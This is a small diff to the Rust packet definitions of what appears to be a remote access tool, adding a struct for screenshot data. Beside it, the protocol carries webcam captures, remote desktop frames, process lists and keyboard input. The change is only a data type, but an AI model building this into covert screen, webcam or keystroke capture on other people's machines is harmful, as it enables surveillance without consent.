@@ -35,7 +35,7 @@ pub enum ServerboundPacket {
     EncryptionRequest,
     EncryptionConfirm(Vec<u8>, Vec<u8>), // encrypted secret and token
     ClientInfo(ClientInfo),
-    ScreenshotResult(Vec<u8>),
+    ScreenshotResult(ScreenshotData),
     WebcamResult(Vec<u8>),
     RemoteDesktopFrame(RemoteDesktopFrame),
     ProcessList(ProcessList),
@@ -253,4 +253,11 @@ pub struct KeyboardInputData {
     pub shift_pressed: bool, // Shift modifier state
     pub ctrl_pressed: bool,  // Ctrl modifier state
     pub caps_lock: bool,     // Caps lock state
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct ScreenshotData {
+    pub width: u32,
+    pub height: u32,
+    pub data: Vec<u8>,
 }
